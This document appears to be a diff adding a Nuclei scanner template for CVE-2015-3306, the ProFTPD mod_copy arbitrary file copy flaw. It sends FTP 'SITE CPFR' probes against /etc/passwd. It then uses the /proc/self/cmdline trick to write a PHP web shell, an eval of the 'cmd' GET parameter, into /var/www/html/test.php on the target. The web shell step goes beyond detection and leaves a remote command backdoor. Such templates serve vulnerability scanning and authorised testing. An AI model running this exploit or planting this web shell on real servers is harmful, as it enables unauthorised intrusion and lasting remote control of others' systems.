@@ -1,0 +1,47 @@
+id: CVE-2015-3306
+
+info:
+  name: ProFTPD mod_copy File Write (CVE-2015-3306)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the SITE CPFR and SITE CPTO commands.
+  reference:
+    - http://bugs.proftpd.org/show_bug.cgi?id=4169
+  classification:
+    cve-id: CVE-2015-3306
+    cvss-metrics: 3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+
+variables:
+  upload_path: "/var/www/html/"
+  upload_content: "<?php echo eval($_GET['cmd']); ?>"
+  file_name: "test.php"
+
+tcp:
+  - inputs:
+      - data: "site cpfr /etc/passwd\n"
+    host:
+      - "{{Hostname}}"
+    port: 21
+    read-size: 1024
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "350 File or directory exists"
+
+  - inputs:
+      - data: "site cpfr /proc/self/cmdline\n"
+      - data: "site cpto /tmp/.{{upload_content}}\n"
+      - data: "site cpfr /tmp/.{{upload_content}}\n"
+      - data: "site cpto {{upload_path}}/{{file_name}}\n"
+    host:
+      - "{{Hostname}}"
+    port: 21
+    read-size: 1024
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "250 Copy successful"
